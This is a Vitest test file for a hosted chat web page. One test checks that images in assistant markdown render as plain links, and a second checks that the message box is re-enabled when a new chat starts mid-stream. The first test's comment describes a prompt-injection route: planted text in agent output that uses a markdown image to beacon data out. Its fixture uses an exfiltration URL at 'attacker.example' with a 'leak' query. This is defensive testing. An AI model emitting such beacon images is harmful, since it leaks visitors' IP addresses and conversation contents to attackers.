import { describe, it, expect, vi, beforeEach } from 'vitest'
import { act, screen, fireEvent, waitFor } from '@testing-library/react'
import React from 'react'

import { render } from '../../test/setup'
import { HostedChatPage, assistantMarkdownComponents } from '../hosted-chat'
import { hostedChatApi, type HostedChatBranding } from '@/lib/hosted-chat'

vi.mock('@/lib/hosted-chat', async () => {
  const actual = await vi.importActual<typeof import('@/lib/hosted-chat')>('@/lib/hosted-chat')
  return {
    ...actual,
    hostedChatApi: {
      branding: vi.fn(),
      conversations: vi.fn(),
      messages: vi.fn(),
      send: vi.fn(),
      deleteConversation: vi.fn(),
      deleteMe: vi.fn(),
      exportData: vi.fn(),
      streamUrl: vi.fn(() => 'http://localhost/stream'),
      me: vi.fn(),
      ssoLoginUrl: vi.fn((slug: string) => '/api/public/chat/' + slug + '/auth/sso/login'),
    },
    downloadBlob: vi.fn(),
    reloadAfterVisitorDeletion: vi.fn(),
  }
})

/**
 * jsdom has no EventSource. close() deliberately fires NOTHING here, which
 * is exactly what a real EventSource does — and is the whole point of the
 * "new chat mid-stream" test below: the page cannot rely on a close()
 * producing a `done` or an `error` to release the composer.
 */
class FakeEventSource {
  static instances: FakeEventSource[] = []
  listeners: Record<string, (event: any) => void> = {}
  onerror: ((event: any) => void) | null = null
  constructor(public url: string) {
    FakeEventSource.instances.push(this)
  }
  addEventListener(type: string, handler: (event: any) => void) {
    this.listeners[type] = handler
  }
  close() {}
}

const branding = (overrides: Partial<HostedChatBranding> = {}): HostedChatBranding => ({
  appName: 'Acme Assistant',
  primaryColor: '#8b5cf6',
  greeting: 'How can Acme help?',
  theme: 'auto',
  logoUrl: null,
  suggestedPrompts: [],
  authMode: 'public_link',
  whiteLabel: false,
  aiDisclosure: null,
  visitorCanDelete: true,
  visitorCanExport: true,
  ...overrides,
})

describe('hosted chat: assistant output is untrusted', () => {
  /**
   * Agent output can carry text an attacker planted — through a channel,
   * a poisoned page the agent read, or a tool result. A markdown image
   * would make the visitor's browser fetch an attacker-chosen URL the
   * moment the bubble paints: a zero-click beacon leaking the visitor's
   * IP and user agent, with conversation text encodable in the query.
   */
  it('renders a markdown image as a link, never as a loading <img>', () => {
    // Asserted first so a missing override reads as "there is no img
    // override" rather than a confusing React element-type error.
    expect(typeof assistantMarkdownComponents.img).toBe('function')
    const Img = assistantMarkdownComponents.img as React.ComponentType<any>
    const { container } = render(
      <Img src="https://attacker.example/x.png?d=leak" alt="totally fine" />,
    )

    expect(container.querySelector('img')).toBeNull()
    const link = container.querySelector('a')
    expect(link).not.toBeNull()
    expect(link).toHaveAttribute('href', 'https://attacker.example/x.png?d=leak')
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'))
    expect(link).toHaveTextContent('totally fine')
  })
})

describe('hosted chat: the composer is never left stuck', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    FakeEventSource.instances = []
    ;(globalThis as any).EventSource = FakeEventSource
    ;(hostedChatApi.branding as any).mockResolvedValue(branding())
    ;(hostedChatApi.conversations as any).mockResolvedValue([{ id: 'c0', title: 'Earlier chat' }])
    ;(hostedChatApi.messages as any).mockResolvedValue({
      conversationId: 'c1',
      title: 'New chat',
      messages: [],
    })
    ;(hostedChatApi.send as any).mockResolvedValue({ runId: 'r1', conversationId: 'c1' })
  })

  /**
   * Clicking "New chat" while a reply streams closes the EventSource, and
   * closing one fires no event at all — so the `done`/`onerror` handlers
   * that are the only place `sending` is cleared never run. Before the fix
   * the composer stayed disabled with a spinner for the life of the page
   * and the visitor had to reload to type again.
   */
  it('re-enables the composer when a new chat starts mid-stream', async () => {
    render(<HostedChatPage slug="acme" />)

    await screen.findByLabelText('Message')
    await waitFor(() => {
      fireEvent.change(screen.getByLabelText('Message'), { target: { value: 'hello' } })
      expect(screen.getByRole('button', { name: 'Send' })).toBeEnabled()
    })
    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: 'Send' }))
    })

    // The run is in flight: the stream is open and Send is spinning.
    await waitFor(() => expect(FakeEventSource.instances.length).toBe(1))
    expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled()

    await act(async () => {
      fireEvent.click(screen.getByRole('button', { name: /New chat/i }))
    })

    // Type again: the button must come back, because nothing else will
    // ever clear `sending` for that abandoned stream.
    await waitFor(() => {
      fireEvent.change(screen.getByLabelText('Message'), { target: { value: 'again' } })
      expect(screen.getByRole('button', { name: 'Send' })).toBeEnabled()
    })
  })
})
